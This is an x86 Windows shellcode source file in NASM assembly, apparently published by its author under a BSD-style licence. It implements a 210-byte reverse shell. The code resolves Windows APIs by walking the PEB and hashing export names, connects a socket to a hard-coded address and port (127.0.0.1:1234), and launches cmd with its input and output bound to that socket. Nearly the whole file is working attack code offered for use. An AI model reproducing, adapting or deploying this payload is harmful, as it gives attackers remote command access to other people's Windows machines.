;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;

; 210 byte reverse shell for x86 windows
;
; - Crashes when cmd terminates.
; - Contains null bytes
;
; odzhan

      %define X86
      %include "../include.inc"
      
      bits   32

      xor    eax, eax
      call   init_api_disp  ; load the API dispatcher
api_hash:      
      dd     0xDF6D65D1     ; WS2_32.dll   + WSASocketA    
      db     'cmd',0h    
      dd     0D2040002h     ; sa.sin_port = htons(1234)
      dd     00100007Fh     ; sa.sin_addr = inet_addr("127.0.0.1")
      dd     0xA324AC0C     ; WS2_32.dll   + connect
      dd     0x611AD39B     ; KERNEL32.dll + CreateProcessA
      dd     0x607F058C     ; KERNEL32.dll + WaitForSingleObject
      ;dd     0x467EDD8B     ; ntdll.dll    + RtlExitUserThread
api_disp: 
      lodsd                 ; eax = hash to find
      pushad                ; saves api hash on stack
      xor    eax, eax
      mov    eax, [fs:eax+TEB.ProcessEnvironmentBlock]
      mov    eax, [eax+PEB.Ldr]
      mov    edi, [eax+PEB_LDR_DATA.InLoadOrderModuleList + LIST_ENTRY.Flink]
      jmp    scan_dll
next_dll:    
      mov    edi, [edi+LDR_DATA_TABLE_ENTRY.InLoadOrderLinks + LIST_ENTRY.Flink]
scan_dll:
      mov    ebx, [edi+LDR_DATA_TABLE_ENTRY.DllBase]
      mov    eax, [ebx+IMAGE_DOS_HEADER.e_lfanew]
      mov    ecx, [ebx+eax+IMAGE_NT_HEADERS.OptionalHeader + \
                           IMAGE_OPTIONAL_HEADER.DataDirectory + \
                           IMAGE_DIRECTORY_ENTRY_EXPORT * IMAGE_DATA_DIRECTORY_size + \
                           IMAGE_DATA_DIRECTORY.VirtualAddress]
      jecxz  next_dll
      mov    esi, [ebx+ecx+IMAGE_EXPORT_DIRECTORY.Name]
      add    esi, ebx
      xor    eax, eax
      cdq
hash_dll_name:
      lodsb
      add    edx, eax                  ;  h += *s++
      rol    edx, 13                   ;  h = ROTL32(h, 13) 
      dec    eax
      jns    hash_dll_name
      mov    ebp, edx
      
      lea    esi, [ebx+ecx+IMAGE_EXPORT_DIRECTORY.NumberOfNames]
      lodsd
      xchg   eax, ecx
      jecxz  next_dll
      ; save IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
      lodsd
      add    eax, ebx
      push   eax
      ; edx = IMAGE_EXPORT_DIRECTORY.AddressOfNames
      lodsd
      xchg   eax, edx
      add    edx, ebx
      ; save IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
      lodsd
      add    eax, ebx
      push   eax
find_api:
      pushad
      mov    esi, [edx+4*ecx-4]        ; esi = RVA of API string
      add    esi, ebx                  ; esi = RVA2VA(esi, ebx)
      xor    eax, eax                  ; zero eax
      cdq                              ; h = 0
hash_api_name:    
      lodsb
      add    edx, eax
      rol    edx, 13
      dec    eax
      jns    hash_api_name
      
      add    edx, ebp
      cmp    edx, [esp + 32 + pushad_t._eax + 2*4] ; hashes match?
      popad
      loopne find_api                  ; --ecx && edx != hash
      pop    edx                       ; AddressOfNameOrdinals
      pop    esi                       ; AddressOfFunctions
      jne    next_dll                            
      movzx  eax, word [edx+ecx*2]     ; eax = AddressOfNameOrdinals[eax]
      add    ebx, [esi+eax*4]          ; ecx = base + AddressOfFunctions[eax]
      mov    [esp + pushad_t._eax], ebx
      popad                            ; restore all
      jmp    eax                       ; jmp to api address
    
init_api_disp:        
      pop    esi                   ; esi = api parameters
      lea    ebp, [esi+(api_disp - api_hash)]
      
      ; edi = alloc(124);    
      push   124
      pop    ecx
      sub    esp, ecx
      mov    edi, esp
      rep    stosb

      ; WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_IP, NULL, 0, 0);
      push   SOCK_STREAM
      push   AF_INET
      call   ebp

      ; CreateProcess(NULL, "cmd", NULL, NULL, 
      ;   TRUE, 0, NULL, NULL, &si, &pi);
      mov    ebx, esp       ; ebx = &si
      lea    edi, [ebx+38h] ; edi = &si.hStdInput
      inc    dword[ebx+2dh] ; si.dwFlags = STARTF_USESTDHANDLES
      stosd                 ; si.hStdInput  = s;
      stosd                 ; si.hStdOutput = s;
      stosd                 ; si.hStdError  = s;
      cdq      
      push   edi            ; lpProcessInformation = &pi
      push   ebx            ; lpStartupInfo        = &si      
      push   edx            ; lpCurrentDirectory   = NULL
      push   edx            ; lpEnvironment        = NULL
      push   edx            ; dwCreationFlags      = 0
      push   eax            ; bInheritHandles      = TRUE
      push   edx            ; lpThreadAttributes   = NULL
      push   edx            ; lpProcessAttributes  = NULL
      push   esi            ; lpCommandLine        = "cmd", 0
      push   edx            ; lpApplicationName    = NULL
      xchg   ebx, eax
      lodsd
      ; connect(s, &sa, sizeof(sa));
      push   10h            ; sizeof(sa)
      push   esi            ; &sa
      push   ebx            ; s
      lodsd                 ; skip &sa
      lodsd
      call   ebp            ; connect
      call   ebp            ; CreateProcessA

      ; WaitForSingleObject(pi.hProcess, INFINITE);
      push   INFINITE
      push   dword [edi]
      call   ebp   
      
      ; RtlExitUserThread();
      ; call   ebp